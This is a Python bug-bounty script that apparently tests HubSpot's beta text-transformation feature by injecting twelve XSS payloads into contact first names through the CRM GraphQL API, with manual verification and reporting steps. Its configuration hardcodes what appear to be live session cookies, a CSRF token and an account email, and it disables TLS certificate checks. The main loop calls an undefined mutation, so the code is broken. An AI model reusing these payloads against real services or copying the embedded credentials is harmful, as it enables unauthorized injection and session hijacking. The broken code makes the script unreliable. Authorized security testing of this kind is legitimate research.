#!/usr/bin/env python3
"""
HubSpot Beta Feature XSS Test
==============================

Tests XSS payloads against beta text transformation feature:
"Remove Whitespace and Format Casing in Text Properties"

Target: Text properties that use beta transformation
Scope: XSS in hubspot.com context (Scope.md line 21)
Method: Encoding bypass via whitespace removal and case formatting

Author: Chavvo DA
Date: 2025-10-18
"""

import urllib.request
import urllib.error
import json
import ssl
import time
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

HUBLET = "na2"
YOUR_PORTAL_ID = "242862774"
CSRF_TOKEN = "AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"
COOKIE_HEADER = "__hs_cookie_cat_pref=1:true_2:true_3:true; hubspotutk=61540ed14959970838d32bf890933b17; FPID=FPID2.2.aoifmDM9VHjP%2B0DNcWTT94YC%2FEDGX%2BQUKaCl%2Fjdgdtg%3D.1750377867; csrf.app=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ; hubspotapi-prefs=0; hs_c2l=GM2U_VYiGQAQstEnImf9GGYYEuXCtIZHai-lwv2vJf8; hs_login_email=buttercup_ck@bugcrowdninja.com; laboratory-anonymous-id=anon3a47f7fc8dce04269224c103f75d; __cf_bm=7dKH9qDJDePvToxZAQU2SiY9i3jf2hve9xuuilwLi8I-1760826732-1.0.1.1-vda.Eac5sCDeWfipJ.KXp8IBAFzrsMW6IcJ7796LRiMWTHoqND0jb2sJSesiIl1mYiJOPSfZQbxGhdPo27YfS_duaGQm.vL8Hza_AAUBGWY; _cfuvid=P4L2XIuM4PEgjpdNcPGFVoP.Gx2I5WQ0OYD_UVZt5Ak-1760824013150-0.0.1.1-604800000; _conv_v=vi%3A1*sc%3A1*cs%3A1760824014*fs%3A1760824014*pv%3A1*exp%3A%7B100330256.%7Bv.1003131869-g.%7B%7D%7D-100347543.%7Bv.1003176559-g.%7B%7D%7D%7D*seg%3A%7B10031564.1-10034364.1-10034366.1%7D; __hstc=20629287.61540ed14959970838d32bf890933b17.1760824016750.1760824016750.1760824016750.1; __hssrc=1; _gcl_au=1.1.36100814.1760824017; hubspotapi-strict=AAccUfv7-gRXdDwtspRytheRo1Dvt8v7fuKZuRDsHaeXEWjZPFkEJDuMrjhEBZcUuBau3tV8DYImQGx1CV9dT4yyki7Alsho1Q; hs_login_metadata=%7B%22ungatedForLoginV4%22%3Afalse%2C%22showABTestVariant%22%3Afalse%2C%22isMobileLogin%22%3Afalse%7D; NPS_e579c260_last_seen=1760824080763; hubspotapi=AAccUfvVqwV8ckfVjAgXHHypyMDdw0i0LwSis7xqtiu5I0mJuSd4nxO8uq0nENoWGgcoyJCBwGg5VQYZwWefh3MCx_4Bgw2A21ungsVaRLcEyaQgHbaZjBoQEcmJYJAuKpk-P5iRa8fm92QGJHx5ZBh8fvOUTZuP5VBXA5dCtO4sfrv3c5awVXPi5SRHYelLVgC0sIwo0p8Mt9XS2YZeAqwE1wx-dIoSzymZG0IMWW2NY2V76HiyHg6D_57S5hJOBYjzZfMNueH9qHf4HRv2NunFoskMHvnDLLip300xpVnF3-PMQ4jZCtV1YB1oGKoNhoMPUgoBg2J4wqynDjCXdxh-X2Lx9U3YWoLfSl12cktnEOWstGIvx-HvgInq2qJ9kCUtkKzZPMXAhTUF8ZeRO_vnKeHbNKZrTDWdO0MEKaleWNmcj4S71XdH6w1EbAJbDf94NET2-83k6FGyQqTcjR3o5Awvu61SlazIbrDCQj-q1guN6DrspqOq4AAQGKyJ1fAlJ8F2uXxWqlAhDMZYumCvvhSBwbCx51yi6sAid3DClmbJUs7iCCwzmj77X2SZ1_4NEmXji2DqUOJPSRcpH6gH3TxRitvR77-tE8p-4lofLsROfThy_nahXzYUPi05qwwRoonjrUgIg4uApDaFYCcQ3goN_TD59IKi2ziR1iZG2C5ukLtvewLzVsxAAnOkS60NEd_f3TRCLcHGcvL2KNh9d_diw-h4zlm7jFsWTH2gk40axNoXeIR9EpwaAciVTxRCqgwW52Gv4tRcrvnSEjLQ32fE3BdNxVSO5gXzEFeY6MYHopBWNJrcvOPKpgPOh3QwTF_LRWFl8pIwaQuRvz1CwCii2N4TZVBhps8wStuhhts_rB1WvZJZzAKaX7q6zanvbAMpR4ocOQy2sVuY-vDD2O8qmGRjlgkcTEyk4b1YCPHWqo9h2RPUKmuOTGUC3VvTpcNQ8HJFsH3r5Kboy1SMNZlkhu50JJ4bE2kYH2S6jg5Z8-c8YT_zT26tD7RLABQtm0yRm6u7pRbnrQopL9YTTh3T_Q5g2hcVNWJJ_7TrpgCPUBorRx34_UgEB8mM9sVy59PwI1s-_y6xs0SD8HnvBtQFa_9A2nuHeebTNkO8vuOTdoATs_cbaD-4sM90zYFr6w-E8vhzJoawsK00Vb7JvJbnvNRrdPI31KQz_Rk6Sk6ch7z1Ub7qAzwudLmVYKQ1MBi1Z-jqS7eKjsIrfXvj51PvnYKvA90_H0Ix1IA_vBKbmTJImOIea1Kx1rX7D5li0hFMs3wPat-JuvFya-lmclMFSRERg8D9lZD3Ss4oH-fsq5EiT5umZhYssM5nGl-Ej7fgKbF52pY6TR87wu-vZBgh-TmM64IaDqdN9368YBE-HO2R33vhlzZQggf4IgkVP1bUJBRXRJGn0KfU0BMm-ZfNNyJXWfTasKNyj-SqdDvdTa4n-ZU; hubspotapi-csrf=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"

# Delay between requests (avoid rate limiting)
REQUEST_DELAY = 10  # seconds

# ============================================================================
# XSS PAYLOAD DEFINITIONS
# ============================================================================

# Each payload targets specific beta transformation behaviors
XSS_PAYLOADS = {
    "WHITESPACE_TAB": {
        "payload": '<img\tsrc=x\tonerror=alert(document.domain)>',
        "description": "Tab characters - tests if whitespace removal creates valid XSS",
        "target": "Whitespace removal transformation"
    },
    "WHITESPACE_SLASH": {
        "payload": '<svg/onload=alert(document.domain)>',
        "description": "Slash instead of space - minimal whitespace bypass",
        "target": "Whitespace removal transformation"
    },
    "WHITESPACE_NEWLINE": {
        "payload": '<img\nsrc=x\nonerror=alert(document.domain)>',
        "description": "Newline characters - tests multiline whitespace handling",
        "target": "Whitespace removal transformation"
    },
    "CASE_MIXED": {
        "payload": '<ScRiPt>alert(document.domain)</ScRiPt>',
        "description": "Mixed case - tests if case formatting normalizes to executable",
        "target": "Case formatting transformation"
    },
    "CASE_MIXED_IMG": {
        "payload": '<iMg sRc=x oNeRrOr=alert(document.domain)>',
        "description": "Mixed case attributes - complex case transformation",
        "target": "Case formatting transformation"
    },
    "CASE_UPPERCASE": {
        "payload": '<SVG ONLOAD=ALERT(document.domain)>',
        "description": "Full uppercase - tests case normalization to lowercase",
        "target": "Case formatting transformation"
    },
    "UNICODE_LONG_S": {
        "payload": '<ſcript>alert(document.domain)</script>',
        "description": "Unicode long S (U+017F) - case folding bypass",
        "target": "Case formatting with unicode normalization"
    },
    "UNICODE_DOTLESS_I": {
        "payload": '<scr\u0131pt>alert(document.domain)</script>',
        "description": "Dotless i (Turkish) - unicode case transformation",
        "target": "Case formatting with unicode normalization"
    },
    "COMBO_CASE_WHITESPACE": {
        "payload": '<ScRiPt\t>alert(document.domain)</ScRiPt>',
        "description": "Combined case + whitespace - tests both transformations",
        "target": "Both whitespace removal and case formatting"
    },
    "COMBO_QUOTE_CASE_WHITESPACE": {
        "payload": '"><iMg\nsRc=x\noNeRrOr=alert(document.domain)>',
        "description": "Quote escape + case + whitespace - context breaking",
        "target": "All transformations with attribute context break"
    },
    "DOUBLE_ENCODING": {
        "payload": '&lt;script&gt;alert(document.domain)&lt;/script&gt;',
        "description": "HTML entity encoding - tests if transformation decodes",
        "target": "Entity decoding during transformation"
    },
    "NULL_BYTE": {
        "payload": '<img src=x onerror=alert(document.domain)%00>',
        "description": "Null byte injection - tests string termination handling",
        "target": "String processing during transformation"
    },
}

# ============================================================================
# GRAPHQL QUERIES AND MUTATIONS
# ============================================================================

# First, create a test contact via CRM objects API
GET_OR_CREATE_CONTACT = """
query SearchTestContacts {
  crmObjectsSearch(
    type: "0-1"
    filterGroups: [{
      filters: [{
        propertyName: "email"
        operator: EQ
        value: "xss-test-baseline@bugcrowdninja.com"
      }]
    }]
    count: 1
  ) {
    total
    results {
      id
    }
  }
}
"""

# Mutation to update contact with XSS payload
# Based on Track A report's updateContact mutation structure
UPDATE_CONTACT_MUTATION = """
mutation UpdateContact($contactId: String!, $portalId: String!, $firstName: String!) {
  updateContact(
    input: {
      id: $contactId
      portalId: $portalId
      properties: {
        firstname: $firstName
      }
    }
  ) {
    id
    properties(names: ["firstname"]) {
      name
      value
    }
  }
}
"""

# ============================================================================
# HTTP REQUEST FUNCTION
# ============================================================================

def execute_graphql(query, variables=None, operation_name=None):
    """Execute GraphQL mutation."""
    url = f"https://app-{HUBLET}.hubspot.com/api/graphql/crm"
    params = f"?portalId={YOUR_PORTAL_ID}&clienttimeout=14000&hs_static_app=crm-index-ui&hs_static_app_version=2.49724"
    full_url = url + params

    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    if operation_name:
        payload["operationName"] = operation_name

    body = json.dumps([payload])

    req = urllib.request.Request(full_url, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('X-HubSpot-CSRF-hubspotapi', CSRF_TOKEN)
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0')
    req.add_header('Accept', 'application/json')
    req.add_header('Origin', f'https://app-{HUBLET}.hubspot.com')

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        response = urllib.request.urlopen(req, body.encode('utf-8'), context=ctx)
        response_data = response.read().decode('utf-8')
        data = json.loads(response_data)

        return {
            'status': response.status,
            'success': True,
            'data': data,
            'error': None
        }

    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8', errors='ignore')
        try:
            error_data = json.loads(error_body)
        except:
            error_data = error_body

        return {
            'status': e.code,
            'success': False,
            'data': error_data,
            'error': f"HTTP {e.code}: {e.reason}"
        }

    except Exception as e:
        return {
            'status': 0,
            'success': False,
            'data': None,
            'error': str(e)
        }

# ============================================================================
# AUTHENTICATION CHECK
# ============================================================================

def check_authentication():
    """
    Pre-flight check to verify cookies are still valid.
    Tests with a simple permissions query before running XSS payloads.

    Returns:
        dict: {'valid': bool, 'error': str or None}
    """
    print("=" * 80)
    print("PRE-FLIGHT AUTHENTICATION CHECK")
    print("=" * 80)
    print("Testing if cookies are still valid before running XSS payloads...\n")

    # Simple query to check auth - basic __typename query
    auth_check_query = """
    query AuthCheck {
      __typename
    }
    """

    result = execute_graphql(
        auth_check_query,
        variables=None,
        operation_name="AuthCheck"
    )

    # Analyze response
    if result['status'] == 401:
        print("❌ AUTHENTICATION FAILED")
        print("\nStatus: 401 Unauthorized")
        print("Cause: Cookies have expired or CSRF token is invalid")
        print("\nACTION REQUIRED:")
        print("1. Log into HubSpot with your low-privileged account")
        print("2. Navigate to: https://app-na2.hubspot.com/contacts/242862774/objects/0-1/views/all/list")
        print("3. Open DevTools (F12) → Network tab → Filter 'graphql'")
        print("4. Copy a GraphQL request as cURL")
        print("5. Extract fresh Cookie header and CSRF token")
        print("6. Update the script configuration")
        print("\n" + "=" * 80)
        return {'valid': False, 'error': 'Authentication failed (401)'}

    elif result['status'] == 403:
        print("❌ FORBIDDEN")
        print("\nStatus: 403 Forbidden")
        print("Cause: CSRF token mismatch or insufficient permissions")
        print("\nACTION REQUIRED:")
        print("1. Verify CSRF token matches the csrf.app cookie value")
        print("2. Ensure you're using the low-privileged account cookies")
        print("\n" + "=" * 80)
        return {'valid': False, 'error': 'Forbidden (403)'}

    elif result['status'] == 200 and result['success']:
        # Check if we got valid data back
        try:
            data = result['data']
            if isinstance(data, list) and len(data) > 0:
                response_data = data[0]

                # Check for GraphQL errors
                errors = response_data.get('errors', [])
                if errors:
                    error_msg = errors[0].get('message', 'Unknown GraphQL error')
                    # If it's just a field validation error but we got 200, auth is probably OK
                    if 'Validation error' in error_msg or 'FieldUndefined' in error_msg:
                        print(f"✅ AUTHENTICATION VALID")
                        print(f"\nStatus: 200 OK")
                        print(f"Note: GraphQL field error but authentication succeeded")
                        print(f"Cookies: Active")
                        print(f"CSRF Token: Valid")
                        print("\n" + "=" * 80)
                        print("Authentication check passed. Proceeding with XSS tests...\n")
                        return {'valid': True, 'error': None}
                    else:
                        print(f"⚠️ GRAPHQL ERROR")
                        print(f"\nStatus: 200 OK but GraphQL returned error")
                        print(f"Error: {error_msg}")
                        print("\n" + "=" * 80)
                        return {'valid': False, 'error': f'GraphQL error: {error_msg}'}

                # Check for successful data response
                if 'data' in response_data and response_data['data'] is not None:
                    typename = response_data.get('data', {}).get('__typename', 'Query')
                    print("✅ AUTHENTICATION VALID")
                    print(f"\nStatus: 200 OK")
                    print(f"Cookies: Active")
                    print(f"CSRF Token: Valid")
                    print(f"GraphQL Response: {typename}")
                    print("\n" + "=" * 80)
                    print("Authentication check passed. Proceeding with XSS tests...\n")
                    return {'valid': True, 'error': None}

            # If we get here, response is 200 but not in expected format
            print(f"✅ AUTHENTICATION LIKELY VALID")
            print(f"\nStatus: 200 OK")
            print(f"Response received (format unexpected but request succeeded)")
            print(f"Note: Cookies appear to be working (no 401/403)")
            print("\n" + "=" * 80)
            print("Proceeding with XSS tests (cookies seem valid)...\n")
            return {'valid': True, 'error': None}

        except Exception as e:
            print(f"⚠️ UNEXPECTED RESPONSE")
            print(f"\nStatus: 200 but response parse failed")
            print(f"Error: {e}")
            print(f"Raw response preview: {str(result['data'])[:200]}")
            print("\n" + "=" * 80)
            return {'valid': False, 'error': f'Parse error: {e}'}

    # Unknown failure
    print(f"❌ UNKNOWN ERROR")
    print(f"\nStatus: {result['status']}")
    print(f"Error: {result.get('error', 'Unknown')}")
    print("\n" + "=" * 80)
    return {'valid': False, 'error': result.get('error', 'Unknown error')}

# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================

def main():
    # Pre-flight authentication check
    auth_result = check_authentication()
    if not auth_result['valid']:
        print("\n🚫 ABORTED: Cannot proceed without valid authentication")
        print(f"Reason: {auth_result['error']}")
        return 1

    print("=" * 80)
    print("HubSpot Beta Feature XSS Test")
    print("Target: Remove Whitespace and Format Casing in Text Properties")
    print("=" * 80)
    print(f"\nPortal ID: {YOUR_PORTAL_ID}")
    print(f"Hublet: {HUBLET}")
    print(f"Payloads: {len(XSS_PAYLOADS)}")
    print(f"Delay between requests: {REQUEST_DELAY} seconds")
    print(f"Test start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    print("=" * 80)

    results = []
    contact_ids = []

    # DEBUG: Test only first payload
    payload_items = list(XSS_PAYLOADS.items())[:1]

    for i, (test_id, test_data) in enumerate(payload_items, 1):
        payload = test_data['payload']
        description = test_data['description']
        target = test_data['target']

        print(f"\n[{i}/{len(XSS_PAYLOADS)}] Testing: {test_id}")
        print("-" * 80)
        print(f"Description: {description}")
        print(f"Target: {target}")
        print(f"Payload: {payload[:60]}{'...' if len(payload) > 60 else ''}")

        # Create unique email for each test
        timestamp = int(time.time())
        email = f"xss-test-{test_id.lower()}-{timestamp}@bugcrowdninja.com"

        # Create contact with XSS payload in firstname
        variables = {
            "firstName": payload,
            "lastName": f"XSSTest{i}",
            "email": email
        }

        result = execute_graphql(CREATE_CONTACT_MUTATION, variables, "CreateContact")

        if result['success']:
            try:
                # Debug: show raw response structure
                print(f"DEBUG: Response data type: {type(result['data'])}")
                print(f"DEBUG: Response data: {json.dumps(result['data'], indent=2)[:500]}")

                data = result['data']

                # Handle both dict and list responses
                if isinstance(data, dict):
                    # Direct dict response
                    contact_data = data.get('data', {}).get('createContact', {}).get('contact', {})
                    contact_id = contact_data.get('id')
                elif isinstance(data, list) and len(data) > 0:
                    # List response (like auth check)
                    contact_data = data[0].get('data', {}).get('createContact', {}).get('contact', {})
                    contact_id = contact_data.get('id')
                else:
                    print(f"⚠️ Unexpected response format: {type(data)}")
                    contact_id = None

                if contact_id:
                    print(f"✅ Contact created: ID {contact_id}")
                    print(f"   Email: {email}")
                    contact_ids.append({
                        'test_id': test_id,
                        'contact_id': contact_id,
                        'payload': payload,
                        'email': email,
                        'url': f"https://app-{HUBLET}.hubspot.com/contacts/{YOUR_PORTAL_ID}/record/0-1/{contact_id}"
                    })
                else:
                    print(f"⚠️ Contact created but no ID returned")
            except Exception as e:
                print(f"⚠️ Parse error: {e}")
                import traceback
                print(f"DEBUG: {traceback.format_exc()}")
        else:
            print(f"❌ Failed: {result['error']}")

        results.append({
            'test_id': test_id,
            'description': description,
            'payload': payload,
            'result': result
        })

        # DEBUG: Skip delay for faster testing
        # Rate limiting delay (except for last request)
        #if i < len(payload_items):
        #    print(f"\nWaiting {REQUEST_DELAY} seconds before next test...")
        #    time.sleep(REQUEST_DELAY)

    # ========================================================================
    # RESULTS SUMMARY
    # ========================================================================
    print("\n" + "=" * 80)
    print("TEST RESULTS SUMMARY")
    print("=" * 80)

    successful_tests = [c for c in contact_ids]
    print(f"\nContacts created: {len(successful_tests)}/{len(XSS_PAYLOADS)}")

    if successful_tests:
        print("\n📋 MANUAL VERIFICATION REQUIRED:")
        print("\nVisit each contact URL below and check if XSS executes:")
        print("(Look for alert box showing 'hubspot.com' domain)\n")

        for i, contact in enumerate(successful_tests, 1):
            print(f"{i}. {contact['test_id']}")
            print(f"   Payload: {contact['payload'][:70]}{'...' if len(contact['payload']) > 70 else ''}")
            print(f"   Contact ID: {contact['contact_id']}")
            print(f"   URL: {contact['url']}")
            print()

        print("=" * 80)
        print("VERIFICATION STEPS:")
        print("=" * 80)
        print("1. Open each URL above in your browser (while logged into HubSpot)")
        print("2. Check if alert() executes showing 'hubspot.com' or similar domain")
        print("3. If XSS fires, take screenshot and document:")
        print("   - Payload used")
        print("   - Contact ID")
        print("   - Screenshot of alert box")
        print("   - Context where it executed (firstname field, etc.)")
        print("\n4. IF XSS CONFIRMED:")
        print("   - Severity: Medium-High (XSS in hubspot.com context)")
        print("   - Scope: In-scope per Scope.md line 21")
        print("   - Impact: Beta feature encoding bypass")
        print("   - Report: Create bug bounty submission with evidence")

    else:
        print("\n❌ No contacts were successfully created")
        print("Check:")
        print("  - Cookies are fresh")
        print("  - CSRF token is valid")
        print("  - GraphQL endpoint is accessible")

    print("\n" + "=" * 80)
    print(f"Test complete: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 80)

    return 0

if __name__ == "__main__":
    exit(main())
